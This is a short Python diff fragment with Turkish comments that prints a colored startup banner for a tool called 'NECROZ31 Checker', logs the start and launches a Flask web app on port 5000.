+    # Terminalde başlatma mesajı
+    print(Fore.RED + "==========================================", end="", flush=True)
+    print(Fore.GREEN + "=== NECROZ31 CHECKER SİSTEMİ BAŞLATILIYOR ===", end="", flush=True)
+    print(Fore.RED + "==========================================" + Style.RESET_ALL, end="", flush=True)
+    yaz_log("Sistem başlatıldı")
+    # Flask uygulamasını çalıştır
+    app.run(host='0.0.0.0', port=5000, debug=False)
